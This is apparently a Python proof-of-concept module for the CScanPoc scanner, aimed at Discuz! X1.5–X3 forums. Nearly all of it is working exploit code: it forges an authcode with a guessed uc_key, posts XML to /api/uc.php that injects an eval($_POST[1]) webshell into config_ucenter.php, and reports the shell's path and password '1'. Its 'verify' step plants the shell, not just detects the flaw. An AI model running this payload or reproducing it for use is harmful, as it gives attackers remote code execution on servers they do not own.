# coding:utf-8
import hashlib
import time
import math
import base64
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import sys

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0132'  # 平台漏洞编号
    name = 'Discuz uc_key getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
    DiscuzX1.5X2.5X3 uc_key getshell    
    '''  # 漏洞描述
    ref = 'https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Discuz/DiscuzX1.5X2.5X3%20uc_key%20getshell/exp.py'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞组件名称
    product_version = 'X1.5X2.5X3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '13cede0b-f57b-4c1f-b171-fe3c2eb69c64'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def microtime(self, get_as_float=False):
        if get_as_float:
            return time.time()
        else:
            return '%.8f %d' % math.modf(time.time())

    def get_authcode(self, string, key=''):
        ckey_length = 4
        key = hashlib.md5(key).hexdigest()
        keya = hashlib.md5(key[0:16]).hexdigest()
        keyb = hashlib.md5(key[16:32]).hexdigest()
        keyc = (hashlib.md5(self.microtime()).hexdigest())[-ckey_length:]
        #keyc = (hashlib.md5('0.736000 1389448306').hexdigest())[-ckey_length:]
        cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()

        key_length = len(cryptkey)
        string = '0000000000' + \
            (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
        string_length = len(string)
        result = ''
        box = list(range(0, 256))
        rndkey = dict()
        for i in range(0, 256):
            rndkey[i] = ord(cryptkey[i % key_length])
        j = 0
        for i in range(0, 256):
            j = (j + box[i] + rndkey[i]) % 256
            tmp = box[i]
            box[i] = box[j]
            box[j] = tmp
        a = 0
        j = 0
        for i in range(0, string_length):
            a = (a + 1) % 256
            j = (j + box[a]) % 256
            tmp = box[a]
            box[a] = box[j]
            box[j] = tmp
            result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
        return keyc + base64.b64encode(result).replace('=', '')

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/api/uc.php'
            host = self.target
            url = host + payload
            key = 'helloworld'
            headers = {'Accept-Language': 'zh-cn',
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
                       'Referer': url
                       }
            tm = time.time()+10*3600
            tm = "time=%d&action=updateapps" % tm
            code = urllib.parse.quote(self.get_authcode(tm, key))
            url = url+"?code="+code
            data1 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
                    <root>
                    <item id="UC_API">http://xxx\');eval($_POST[1]);//</item>
                    </root>'''
            try:
                req = urllib.request.Request(url, data=data1, headers=headers)
                ret = urllib.request.urlopen(req)
            except:
                return
            data2 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
                    <root>
                    <item id="UC_API">http://aaa</item>
                    </root>'''
            try:
                req = urllib.request.Request(url, data=data2, headers=headers)
                ret = urllib.request.urlopen(req)
            except:
                return
            self.output.report(self.vuln, '发现{target}存在{name}漏洞;webshell:"+{target}+"/config/config_ucenter.php,password:1"'.format(
                target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
